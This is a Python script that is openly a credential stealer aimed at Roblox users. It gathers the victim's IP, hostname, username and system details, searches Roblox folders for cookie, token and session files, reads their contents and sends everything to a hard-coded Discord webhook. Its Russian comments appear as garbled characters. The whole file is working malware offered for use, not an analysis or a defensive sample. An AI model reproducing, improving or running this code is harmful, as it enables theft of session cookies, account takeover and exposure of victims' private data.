import os
import json
import requests
import platform
import socket
from pathlib import Path
import sys
import tempfile
import shutil

WEBHOOK_URL = "https://discord.com/api/webhooks/1431427795682328698/mUTGrbjd0Cy_WeR0dfOaLyocTQGAEH-KuK6F54lvIir0T3NGoVD0Nfpe0LUIGpScfoxj"

class SystemStealer:
    def __init__(self):
        self.system_info = self.get_system_info()
        
    def get_system_info(self):
        """–°–±–æ—Ä –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ —Å–∏—Å—Ç–µ–º–µ"""
        try:
            # –ü–æ–ª—É—á–∞–µ–º –≤–Ω–µ—à–Ω–∏–π IP
            ip = requests.get('https://api.ipify.org', timeout=10).text
        except:
            ip = "Unknown"
            
        return {
            'ip': ip,
            'hostname': socket.gethostname(),
            'user': os.getenv('USERNAME'),
            'os': f"{platform.system()} {platform.release()}",
            'processor': platform.processor(),
            'architecture': platform.architecture()[0]
        }
    
    def find_roblox_cookies(self):
        """–ü–æ–∏—Å–∫ —Ñ–∞–π–ª–æ–≤ —Å –∫—É–∫–∞–º–∏ Roblox"""
        cookies_found = []
        
        # –ü—É—Ç–∏ –≥–¥–µ Roblox —Ö—Ä–∞–Ω–∏—Ç –¥–∞–Ω–Ω—ã–µ
        search_paths = [
            os.path.join(os.environ['LOCALAPPDATA'], 'Roblox'),
            os.path.join(os.environ['APPDATA'], 'Roblox'),
            os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Roblox'),
        ]
        
        for base_path in search_paths:
            if os.path.exists(base_path):
                print(f"üîç Searching in: {base_path}")
                try:
                    for root, dirs, files in os.walk(base_path):
                        for file in files:
                            file_lower = file.lower()
                            # –ò—â–µ–º —Ñ–∞–π–ª—ã –∫–æ—Ç–æ—Ä—ã–µ –º–æ–≥—É—Ç —Å–æ–¥–µ—Ä–∂–∞—Ç—å –∫—É–∫–∏
                            if any(keyword in file_lower for keyword in [
                                'cookie', 'roblosecurity', 'auth', 'token', 
                                'session', 'login', 'account'
                            ]):
                                file_path = os.path.join(root, file)
                                try:
                                    # –ß–∏—Ç–∞–µ–º —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ —Ñ–∞–π–ª–∞
                                    if os.path.getsize(file_path) < 1000000:  # –î–æ 1MB
                                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                            content = f.read(5000)  # –ß–∏—Ç–∞–µ–º –ø–µ—Ä–≤—ã–µ 5000 —Å–∏–º–≤–æ–ª–æ–≤
                                            
                                        if content and len(content) > 10:
                                            cookies_found.append({
                                                'file': file,
                                                'path': file_path,
                                                'content': content,
                                                'size': os.path.getsize(file_path)
                                            })
                                            print(f"‚úÖ Found: {file}")
                                except:
                                    pass
                except Exception as e:
                    print(f"‚ùå Error in {base_path}: {e}")
        
        return cookies_found
    
    def steal_browser_data(self):
        """–ö—Ä–∞–∂–∞ –¥–∞–Ω–Ω—ã—Ö –∏–∑ –±—Ä–∞—É–∑–µ—Ä–æ–≤"""
        browsers = []
        browser_paths = {
            'Chrome': os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome'),
            'Firefox': os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox'),
            'Edge': os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge'),
            'Opera': os.path.join(os.environ['APPDATA'], 'Opera Software'),
        }
        
        for name, path in browser_paths.items():
            if os.path.exists(path):
                browsers.append(f"‚úÖ {name} - {path}")
            else:
                browsers.append(f"‚ùå {name} - Not found")
                
        return browsers
    
    def create_system_report(self):
        """–°–æ–∑–¥–∞–Ω–∏–µ –ø–æ–ª–Ω–æ–≥–æ –æ—Ç—á–µ—Ç–∞"""
        print("üïµÔ∏è Collecting system information...")
        system_info = self.system_info
        
        print("üîç Searching for Roblox cookies...")
        cookies = self.find_roblox_cookies()
        
        print("üåê Checking browsers...")
        browsers = self.steal_browser_data()
        
        # –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
        message = "üî¥ **SYSTEM DATA STEALER - FULL REPORT** üî¥\n\n"
        
        message += "üíª **SYSTEM INFORMATION**\n"
        for key, value in system_info.items():
            message += f"{key}: {value}\n"
        
        message += "\nüîê **ROBLOX COOKIES FOUND**\n"
        if cookies:
            for cookie in cookies:
                message += f"üìÅ {cookie['file']} ({cookie['size']} bytes)\n"
                message += f"üìç Path: {cookie['path']}\n"
                message += f"üìù Content: ```{cookie['content'][:1000]}...```\n\n"
        else:
            message += "‚ùå No Roblox cookies found\n\n"
        
        message += "üåê **INSTALLED BROWSERS**\n"
        for browser in browsers:
            message += f"{browser}\n"
        
        message += f"\nüïí **REPORT TIME**\n{self.get_current_time()}"
        
        return message
    
    def get_current_time(self):
        from datetime import datetime
        return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    def send_to_discord(self, message):
        """–û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –≤ Discord"""
        try:
            # –†–∞–∑–±–∏–≤–∞–µ–º –¥–ª–∏–Ω–Ω—ã–µ —Å–æ–æ–±—â–µ–Ω–∏—è
            if len(message) > 2000:
                parts = [message[i:i+2000] for i in range(0, len(message), 2000)]
                for part in parts:
                    requests.post(WEBHOOK_URL, json={"content": part}, timeout=10)
                    print("‚úÖ Data sent to Discord")
            else:
                requests.post(WEBHOOK_URL, json={"content": message}, timeout=10)
                print("‚úÖ Data sent to Discord")
                
        except Exception as e:
            print(f"‚ùå Discord error: {e}")
    
    def run(self):
        """–ó–∞–ø—É—Å–∫ —Å—Ç–∏–ª–ª–µ—Ä–∞"""
        print("üöÄ Starting System Stealer...")
        print("üíª Collecting data from system...")
        
        try:
            report = self.create_system_report()
            self.send_to_discord(report)
            print("üéØ Stealer completed successfully!")
        except Exception as e:
            print(f"‚ùå Stealer error: {e}")
        
        # –°–æ—Ö—Ä–∞–Ω—è–µ–º –æ—Ç—á–µ—Ç –≤ —Ñ–∞–π–ª
        try:
            with open("system_report.txt", "w", encoding="utf-8") as f:
                f.write(report)
            print("üìÑ Report saved as system_report.txt")
        except:
            print("‚ùå Could not save report file")

def main():
    # –ü—Ä–æ–≤–µ—Ä–∫–∞ webhook
    if "—Ç–≤–æ–π_–≤–µ–±—Ö—É–∫_–∑–¥–µ—Å—å" in WEBHOOK_URL:
        print("‚ùå ERROR: Replace '—Ç–≤–æ–π_–≤–µ–±—Ö—É–∫_–∑–¥–µ—Å—å' with your Discord webhook!")
        input("Press Enter to exit...")
        return
    
    # –ó–∞–ø—É—Å–∫ —Å—Ç–∏–ª–ª–µ—Ä–∞
    stealer = SystemStealer()
    stealer.run()
    
    # –ü–∞—É–∑–∞ –ø–µ—Ä–µ–¥ –∑–∞–∫—Ä—ã—Ç–∏–µ–º
    print("\n‚èπÔ∏è  Press Enter to exit...")
    input()

if __name__ == "__main__":
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏
    try:
        import requests
    except ImportError:
        print("‚ùå ERROR: Install requests first!")
        print("üí° Run: pip install requests")
        input("Press Enter to exit...")
        sys.exit(1)
    
    main()
